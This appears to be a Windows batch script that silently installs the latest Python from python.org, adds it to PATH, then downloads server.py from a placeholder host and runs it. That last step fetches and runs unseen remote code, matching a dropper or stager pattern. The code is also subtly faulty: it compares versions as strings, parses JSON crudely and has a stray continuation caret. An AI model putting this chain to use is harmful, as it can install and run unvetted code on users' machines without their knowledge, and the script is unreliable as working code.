@echo off
setlocal EnableDelayedExpansion

set url=https://endoflife.date/api/python.json

set "response="
for /f "usebackq delims=" %%i in (`powershell -command "& {(Invoke-WebRequest -Uri '%url%').Content}"`) do set "response=!response!%%i"

set "latest_py_version="
for /f "tokens=1,2 delims=}" %%a in ("%response%") do (
    set "object=%%a}"
    for %%x in (!object!) do (
        for /f "tokens=1,* delims=:" %%y in ("%%x") do (
            if "%%~y" == "latest" (
                set "latest_py_version=%%~z"
            )
        )
    )
)

set python_version=%latest_py_version%

set "current_version="
where python >nul 2>nul && (
    for /f "tokens=2" %%v in ('python --version 2^>^&1') do set "current_version=%%v"
)
if "%current_version%"=="" (
    echo Python is not installed. Proceeding with installation.
) else (
    if "%current_version%" geq "%python_version%" (
        goto skip
    )
)

set "url=https://www.python.org/ftp/python/%python_version%/python-%python_version%-amd64.exe"
set "installer=python-%python_version%-amd64.exe"

set "targetdir=C:\Python%python_version%"

powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%installer%')"

start /wait %installer% /quiet /passive TargetDir=%targetdir% Include_test=0 ^

setx PATH "%targetdir%;%PATH%"
if %errorlevel% EQU 1 (
  exit
)

del %installer%

goto skip

skip:
CD temp
powershell -Command "Invoke-WebRequest https://YOUR_FILE_WEBSITE_THAT_HOSTS_SERVER.PY -OutFile server.py"
C:\Python%python_version%\python.exe server.py
